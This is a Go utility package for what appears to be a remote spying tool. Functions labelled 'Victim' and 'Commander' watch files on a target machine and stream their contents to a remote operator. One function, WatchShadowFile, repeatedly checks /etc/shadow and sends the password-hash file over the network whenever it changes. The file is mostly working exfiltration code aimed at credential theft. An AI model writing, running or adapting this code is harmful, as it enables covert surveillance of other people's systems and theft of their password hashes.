package util        
// deal with endianness: it only supports little endian here
import (
    "encoding/binary"
    "encoding/json"
    "fmt"
    "io"
    "net"
    "os"
	"errors"
    "strings"
    "path/filepath"
    "context"
    "github.com/fsnotify/fsnotify"
    "crypto/sha256"
    "time"
)

type FileHeader struct {
    Name string `json:"name"`
    Size int64  `json:"size"`
}

type EventHeader struct{
	Event       fsnotify.Event	    `json:"event"`
    Size        int64  			    `json:"size"`
    IsDirectory bool                `json.isdirectory`
}

func SendFile(conn net.Conn, path string) error{
    path = strings.TrimSpace(path)
	info, err := os.Stat(path)
	if err != nil{ 
        return err 
	}
    if info.IsDir() { 
        return fmt.Errorf("%s is a directory not a file", path)
	}
	file, err := os.Open(path)
	if err != nil {
        return err 
	}
    fileHeader := FileHeader{
        Size: info.Size(),
        Name: info.Name(),  
    }
    if err := NetWrite[FileHeader](conn, fileHeader); err != nil{
        return err 
    }
	if _, err := io.Copy(conn, file); err != nil{
		return err 
	} 
	return nil 
}

func RecvFile(conn net.Conn, location string) error{
    location = strings.TrimSpace(location)
    fileHeader, err := NetRead[FileHeader](conn) 
    if err != nil{
        return err 
    }
    path := filepath.Join(location, fileHeader.Name) 
    file, err := os.Create(path)
    if err != nil {
        return err 
    }
    defer file.Close()
    if _, err := io.CopyN(file, conn, fileHeader.Size); err != nil{
        return err 
    } 
	return nil 
}

func WatchInodeVictim(conn net.Conn, path string, ctx context.Context) error {
    path = strings.TrimSpace(path)
    if err := ctx.Err(); err != nil {
		return err 
	}
    watcher, err := fsnotify.NewWatcher()
    if err != nil {
        return err 
    }
    defer watcher.Close()
	if err := watcher.Add(path); err != nil{
		return err 
	}
    for {
        select {
        case <-ctx.Done():
            fmt.Println("Context canceled. Stopping watcher.")
            return nil

        // errors
        case err, ok := <-watcher.Errors:
            if !ok {
                return errors.New("failed fetch fswatch error")
            }
			if err != nil{
				fmt.Println(err)
			}

        // events 
        case event, ok := <-watcher.Events:
            if !ok {
                return errors.New("failed to fetch fs event")
            }
            info, err := os.Stat(path)
            if err != nil {
                return err
            }
            eventHeader := EventHeader{
                Event: event, 
                IsDirectory: info.IsDir(), 
                Size: info.Size(), 
            }
            if err := NetWrite[EventHeader](conn, eventHeader); err != nil{
                return err 
            }
            if !info.IsDir(){
                inode, err := os.Open(path)
                if err != nil {
                    return err 
                }
                if _, err := io.CopyN(conn, inode, eventHeader.Size); err != nil{
                    return err 
                } 
                inode.Close()
            }    
        }
    }
    return nil 
}

func WatchInodeCommander(conn net.Conn, saveLocation string, ctx context.Context) error{
    saveLocation = strings.TrimSpace(saveLocation)
    for {
        select {
        case <-ctx.Done():
            fmt.Println("Context canceled. Stopping watcher.")
            return nil
        default:
            eventHeader, err := NetRead[EventHeader](conn)
            if err != nil{
                return err 
            }
            if eventHeader.IsDirectory{
                fmt.Println(eventHeader.Event.Op.String(), eventHeader.Event.Name)
            } else {
                baseName := filepath.Base(eventHeader.Event.Name)
                localPath := filepath.Join(saveLocation, baseName)
                inode, err := os.Create(localPath)
                if err != nil {
                    return err 
                }
                if _, err := io.CopyN(inode, conn, eventHeader.Size); err != nil{
                    return err 
                } 
                fmt.Println(eventHeader.Event.Op.String(), eventHeader.Event.Name, localPath)
                inode.Close() 
            }
        }
    }
    return nil 
}

func NetWrite[T any](conn net.Conn, item T) error{
    itemBytes, err := json.Marshal(item)
    if err != nil {
		return err 
    }
    itemBytesLen := int64(len(itemBytes))
    if err := binary.Write(conn, binary.LittleEndian, itemBytesLen); err != nil { 
        return err 
    }
    if written, err := conn.Write(itemBytes); err != nil {
        return err 
    } else if int64(written) != itemBytesLen{
        return errors.New("Paritial network write")
    }
    return nil 
}

func NetRead[T any](conn net.Conn) (T, error){
    var item T 
    var itemBytesLen int64 
    if err := binary.Read(conn, binary.LittleEndian, &itemBytesLen); err != nil { 
        return item, err 
    }
    if itemBytesLen <= 0 {
        return item, fmt.Errorf("Network size less than or equal to zero")
    }
    itemBytes := make([]byte, itemBytesLen)
    if read, err := io.ReadFull(conn, itemBytes); err != nil {
        return item, err 
    } else if int64(read) != itemBytesLen{
        return item, errors.New("Paritial network read")
    }
    if err := json.Unmarshal(itemBytes, &item); err != nil {
        return item, err 
    }
    return item, nil 
}

func FileHash(path string) ([32]byte, error) {
    path = strings.TrimSpace(path)
    file, err := os.Open(path)
    if err != nil {
        return [32]byte{}, err 
    }
    defer file.Close()
    hasher := sha256.New()
    if _, err := io.Copy(hasher, file); err != nil {
        return [32]byte{}, err 
    }
    var sum [32]byte
    copy(sum[:], hasher.Sum(nil))
    return sum, nil
}

func WatchShadowFile(conn net.Conn, interval int, ctx context.Context) error{
    path := "/etc/shadow"
    prevHash, err := FileHash(path)
    if err != nil {
		fmt.Println(err)
        return err
    }
    ticker := time.NewTicker(time.Duration(interval))
    defer ticker.Stop()
    for {
        select {
        case <-ctx.Done():
			return errors.New("context canceled")
        case <-ticker.C:
            currHash, err := FileHash(path)
            if err != nil {
				return err  
            }
            if currHash != prevHash {
                prevHash = currHash
                info, err := os.Stat(path)
                if err != nil {
                    return err
                }
                inode, err := os.Open(path)
                if err != nil {
                    return err 
                }
                eventHeader := EventHeader{
                    Event: fsnotify.Event{Name: path, Op: fsnotify.Write,}, 
                    Size: info.Size(), 
                }
                if err := NetWrite[EventHeader](conn, eventHeader); err != nil{
                    return err 
                }
                if _, err := io.CopyN(conn, inode, eventHeader.Size); err != nil{
                    return err 
                } 
                inode.Close()
            }
        }
    }
}



